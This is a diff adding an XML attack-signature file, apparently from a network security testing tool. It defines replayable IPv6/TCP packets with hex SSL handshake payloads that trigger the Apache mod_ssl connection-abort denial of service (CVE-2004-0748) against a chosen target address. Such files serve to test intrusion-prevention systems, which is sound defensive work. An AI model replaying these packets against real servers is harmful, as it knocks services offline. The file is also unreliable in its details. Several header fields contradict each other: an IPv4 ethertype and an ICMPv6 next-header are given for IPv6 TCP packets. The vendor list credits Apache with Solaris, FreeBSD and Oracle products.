@@ -1,0 +1,176 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Apache 2 mod_ssl Connection Abort Denial of Service (IPv6 Version)"/>
+    <EngDesc display="true" value="A vulnerability exists in the Apache HTTP server SSL module, mod_ssl. This module, which is responsible for managing encrypted communications, can be forced into an infinite loop by the unexpected termination of connection. This vulnerability may be exploited by an attacker to cause a denial of service condition. (IPv6 Version)"/>
+    <Intent display="true"/>
+    <Protocol display="true" value="SSL/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="The_Apache_Software_Foundation"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_Apache_HTTP_Server"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_HP-UX"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_HP-Secure_Web_Server_for_OpenVMS"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_WebSphere"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_HTTP_Server"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_Mac_OS_X_Server"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_Oracle_HTTP_Server"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_Oracle9i_Application_Server"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_Oracle_Database_Server"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_IRIX"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_Solaris"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_FreeBSD"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_NetBSD_Linux"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_Linux"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_Core"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_Linux_Mandrake"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_Multi_Network_Firewall"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_Suse_Linux"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_Desktop"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_Enterprise_Linux_AS"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_Enterprise_Linux_ES"/>
+      <item value="The_Apache_Software_Foundation_The_Apache_Software_Foundation_Enterprise_Linux_WS"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="The_Apache_Software_Foundation_Apache_HTTP_Server_2.0.50_and_earlier_2.0.x"/>
+      <item value="The_Apache_Software_Foundation_HP-UX_10.20"/>
+      <item value="The_Apache_Software_Foundation_HP-UX_11.0"/>
+      <item value="The_Apache_Software_Foundation_HP-UX_11.11"/>
+      <item value="The_Apache_Software_Foundation_HP-Secure_Web_Server_for_OpenVMS_1.2"/>
+      <item value="The_Apache_Software_Foundation_WebSphere_"/>
+      <item value="The_Apache_Software_Foundation_HTTP_Server_"/>
+      <item value="The_Apache_Software_Foundation_Mac_OS_X_Server_10.1"/>
+      <item value="The_Apache_Software_Foundation_Mac_OS_X_Server_10.2"/>
+      <item value="The_Apache_Software_Foundation_Mac_OS_X_Server_10.3"/>
+      <item value="The_Apache_Software_Foundation_Oracle_HTTP_Server_"/>
+      <item value="The_Apache_Software_Foundation_Oracle9i_Application_Server_"/>
+      <item value="The_Apache_Software_Foundation_Oracle_Database_Server_"/>
+      <item value="The_Apache_Software_Foundation_IRIX_6.5"/>
+      <item value="The_Apache_Software_Foundation_Solaris_7.0"/>
+      <item value="The_Apache_Software_Foundation_Solaris_8.0"/>
+      <item value="The_Apache_Software_Foundation_Solaris_9.0"/>
+      <item value="The_Apache_Software_Foundation_FreeBSD_4"/>
+      <item value="The_Apache_Software_Foundation_FreeBSD_4.2"/>
+      <item value="The_Apache_Software_Foundation_FreeBSD_4.9"/>
+      <item value="The_Apache_Software_Foundation_FreeBSD_4.10"/>
+      <item value="The_Apache_Software_Foundation_FreeBSD_5.0"/>
+      <item value="The_Apache_Software_Foundation_FreeBSD_5.1"/>
+      <item value="The_Apache_Software_Foundation_FreeBSD_5.2"/>
+      <item value="The_Apache_Software_Foundation_FreeBSD_5.2.1"/>
+      <item value="The_Apache_Software_Foundation_NetBSD_Linux_1.5"/>
+      <item value="The_Apache_Software_Foundation_NetBSD_Linux_1.6.1"/>
+      <item value="The_Apache_Software_Foundation_NetBSD_Linux_1.6.2"/>
+      <item value="The_Apache_Software_Foundation_Linux_6.0"/>
+      <item value="The_Apache_Software_Foundation_Linux_7.0"/>
+      <item value="The_Apache_Software_Foundation_Linux_8.0"/>
+      <item value="The_Apache_Software_Foundation_Linux_3.0"/>
+      <item value="The_Apache_Software_Foundation_Core_1"/>
+      <item value="The_Apache_Software_Foundation_Core_2"/>
+      <item value="The_Apache_Software_Foundation_Linux_1.2"/>
+      <item value="The_Apache_Software_Foundation_Linux_1.4"/>
+      <item value="The_Apache_Software_Foundation_Linux_Mandrake_9.1"/>
+      <item value="The_Apache_Software_Foundation_Linux_Mandrake_9.2"/>
+      <item value="The_Apache_Software_Foundation_Linux_Mandrake_10.0"/>
+      <item value="The_Apache_Software_Foundation_Multi_Network_Firewall_8.2"/>
+      <item value="The_Apache_Software_Foundation_Suse_Linux_8.1"/>
+      <item value="The_Apache_Software_Foundation_Suse_Linux_8.2"/>
+      <item value="The_Apache_Software_Foundation_Suse_Linux_9.0"/>
+      <item value="The_Apache_Software_Foundation_Suse_Linux_9.1"/>
+      <item value="The_Apache_Software_Foundation_Linux_9"/>
+      <item value="The_Apache_Software_Foundation_Desktop_3"/>
+      <item value="The_Apache_Software_Foundation_Enterprise_Linux_AS_3"/>
+      <item value="The_Apache_Software_Foundation_Enterprise_Linux_ES_v3"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20040903-01"/>
+    <CVEID display="true" value="CVE-2004-0748"/>
+    <bugtraqID display="true" value="11094"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="d9674b43a3d8f2c2eb6fdb3685377f78"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1225900657"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1213652360" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="M"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="N"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="O"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="P"/>
+    <NamedVar name="SSLdestPort" type="ImperfectControls.Port" value="null" index="Q"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+      <for index="P"/>
+      <for index="Q"/>
+    </for>
+    <for index="F"/>
+    <for index="J">
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+      <for index="P"/>
+      <for index="Q"/>
+    </for>
+    <for index="K"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$SSLdestPort" SeqNumber="1B6309FE" AckNumber="6DE55521" HeaderLength="08" WindowSize="16D0" Checksum="7592" UrgentPointer="0000" Options="0101080A01C127B30B9D3FFB" Payload="160300005F0100005B030041393F94904D5D4C908BECF1DB907D98490E0A5CFEF05BEFB19A9F18F85612BA00003400390038003500160013000A00330032002F006600050004006300620061001500120009006500640060001400110008000600030100" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="J" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$SSLdestPort" SeqNumber="1B630A62" AckNumber="6DE55B28" HeaderLength="08" WindowSize="21F0" Checksum="94A9" UrgentPointer="0000" Options="0101080A01C127B90B9D3FFD" Payload="16030003190B00031500031200030F3082030B30820274A003020102020102300D06092A864886F70D0101040500305D310B30090603550406130243413110300E060355040813074F6E746172696F3110300E06035504071307546F726F6E746F310C300A060355040A1303465343310C300A060355040B1303565254310E300C060355040313055652544341301E170D3034303930343030353430385A170D3035303930343030353430385A3051310B30090603550406130243413110300E060355040813074F6E746172696F3110300E06035504071307546F726F6E746F310C300A060355040A13034653433110300E060355040313077374756E6E656C30819F300D06092A864886F70D010101050003818D0030818902818100F56B14DC17EF4B720F66272792DC1B7F61442BD5469D249B633AB4CC4907E496E7C59927166E24D9401C04B7AC8FA7E65A67E263887E03B91E8F9E19A537B226EA5E8B0AC6DDFA8A48C24A6008249F2060E92C76CBA4C5310912870750C7EB0133009CA01D1A9866586FC648D497ABE7251AA39CCACD7FC0B1E74890E6D59B4D0203010001A381E63081E3300C0603551D13040530030101FF302C06096086480186F842010D041F161D4F70656E53534C2047656E657261746564204365727469666963617465301D0603551D0E0416041417CE2ED3393B226C3518CEB8CAB8F4D5A7ACF5AD3081850603551D23047E307C801489D35C7FC9888475FD70AF860C4C12D0A52204D3A161A45F305D310B30090603550406130243413110300E060355040813074F6E746172696F3110300E06035504071307546F726F6E746F310C300A060355040A1303465343310C300A060355040B1303565254310E300C060355040313055652544341820100300D06092A864886F70D01010405000381810004A3CD77C4DE2E0C2BC7086C9E8313B3F16F88EDFFBB2533DA65D37772096CBBA7A9C7E54E97A0048C6A604609BD79BE48F105050A8B753A4B9B9E56B46B898419DA2A34D9300ED98CB6E26416B9DE73ABC39C7593EB0926868627C4D54A9895C6F6EA1E8EBB2EA7C34447080624AA2DC5030F5E0EAA85C1DA99F99F5352A3F31603000086100000820080C16B8D15BB960579BFDB7AF63DE9A878FA90EA6A0EF45FB586358EB1EB5A73170C5A75913A84404630E315A85AFF71DCDAB990518402B228E9A13D99FFC4E6B53E97C9664E859FD9E734CC4D38432E0DE8857E1E39F789CF708716867D9B39DF1EF20583F44F2FD83AFF54DAF71C7CCBD1C2D874FCBEBBC5AF9232556745DE2116030000860F000082008036231C2249DB21D82C41C67226BCEE46C8E5BF6B50FEB3D977897DF695B703E004AE22D6B12D93A1C518482F2C40C439CDDD655F17E54DBE954C8460EC5F9564E8517F9D11588FCC509C8C66A7C2C9CEBE9D02C710BD0C57033278833BDF14570B85FEA43CC8EDF9682CED680C5FC490563F35A8676BB5C96424B001D4A3E48114030000010116030000409979CB8F87947EA749D25F1F7B41AC370D240F18424320566C8191CDF90473959FE90B2F1720418EBFDF91E05F8A5E621E8F87223CBBA7DD1E6FB48F86ED0F93" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,3">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6DE55521" AckNumber="1B630A62" HeaderLength="08" WindowSize="16A0" Checksum="9214" UrgentPointer="0000" Options="0101080A0B9D3FFD01C127B3" Payload="160300004A0200004603004139386D17DB081BD1D1AAE80BEA0542EB6EA8B52D3508E92863344620B9BA8F2025FDFD7BF08F9DB12A76F7FF1027BC8AC8089CAB60E79E1D693C6C79D03B75A900390016030003350B00033100032E00032B3082032730820290A003020102020100300D06092A864886F70D01010405003071310B30090603550406130243413110300E060355040813074F6E746172696F3110300E06035504071307546F726F6E746F310C300A060355040A1303465343310C300A060355040B1303565254310E300C0603550403130556525436303112301006092A864886F70D01090116034E2F41301E170D3034303932333232353233335A170D3037303932333232353233335A3071310B30090603550406130243413110300E060355040813074F6E746172696F3110300E06035504071307546F726F6E746F310C300A060355040A1303465343310C300A060355040B1303565254310E300C0603550403130556525436303112301006092A864886F70D01090116034E2F4130819F300D06092A864886F70D010101050003818D0030818902818100B3E41DE929E17D3E503A537CA3429A17ED384B1EC1AF2261A885EBC87CD6E4FF797C3199E4362EB2785A22DC1A596CC801B8737561B7CD2D623C0DE4409036ECE285D9917CB09261762A8BCE5011FC55C26573833988DE079C663EC09A800098F016D3E2E9DF1312943A09DF6A179F9F5D06355D3F4D9EDD43D6FBBBC0AAA2E70203010001A381CE3081CB301D0603551D0E04160414071133034A44992849B0B815D691DCA6E3D5C63530819B0603551D230481933081908014071133034A44992849B0B815D691DCA6E3D5C635A175A4733071310B30090603550406130243413110300E060355040813074F6E746172696F3110300E06035504071307546F726F6E746F310C300A060355040A1303465343310C300A060355040B1303565254310E300C0603550403130556525436303112301006092A864886F70D01090116034E2F41820100300C0603551D13040530030101FF300D06092A864886F70D01010405000381810081AC91F19F547F79D096858D7F8ED50BF2B00788E0E15615E8810CBDC669318257DE42A24D4F2B095D46447E49F7D47F0AF9B43F6C76990084EEF50E0583648BC1078AEC87249EC52BABE866BF2CB67AA7574210BDEDCBE4C1DE00B7A719E8766F3D7CB5CD32D164BB711ABAE0B1EF992585B481D91A61CF4992FB2B2597BC06160300018D0C0001890080E6969D3D495BE32C7CF180C3BDD4798E91B7818251BB055E2A2064904A79A770FA15A259CBD523A6A6EF09C43048D5A22F971F3C20129B48000E6EDD061CBC053E371D794E5327DF611EBBBE1BAC9B5C6044CF023D76E05EEA9BAD991B13A63C974E9EF1839EB5DB125136F7262E56A8871538DFD823C6505085E21F0DD5C86B00010200807E8BCA1C29213634271EF1BDB923817BA8E341709A8C5A9134317911198FCB9659B4B344252526164F5FB621039829D9E241E28A75E207CFDB5FA67198CCDE4448E314ED0920E8B08E172D095F0992DD1016CE9BF1BD42F2E48F45B87ECD901028AFB1881DE59EDE889065D9E3411CBA510966811A1BE3E2ADC6907F39E0FB7E0080A7A5F3F29998F10C94B89EA6BB00898EC4DE9421F0BE355FD04113C8F3E8CABA76898C08CECFF1B79BE827F5B754A86DBDE82052401020B32433D96C1BE7E039F43531F69FD5279F4A65588A31B59C7F0F7E50ADA7109A4C926B2FE4E7A5D086D3F1F04586B70818E6D64A7E8213BA13FA9EF3DF655F0567C4F46569C4027A1616030000E70D0000DF0603040506010200D600733071310B30090603550406130243413110300E060355040813074F6E746172696F3110300E06035504071307546F726F6E746F310C300A060355040A1303465343310C300A060355040B1303565254310E300C0603550403130556525436303112301006092A864886F70D01090116034E2F41005F305D310B30090603550406130243413110300E060355040813074F6E746172696F3110300E06035504071307546F726F6E746F310C300A060355040A1303465343310C300A060355040B1303565254310E300C0603550403130556525443410E000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="K" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="6DE55B28" AckNumber="1B630EE1" HeaderLength="08" WindowSize="1F79" Checksum="B8CE" UrgentPointer="0000" Options="0101080A0B9D400201C127B9" Payload="140300000101160300004018FCCEFA0A4127516CFBBB9FD2DBC519A31ECE4BA9513804F5E1A84A579169F544A69C9882915F152380F7CA385C363499632E0671DA63ED4E9CB40656C68147" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
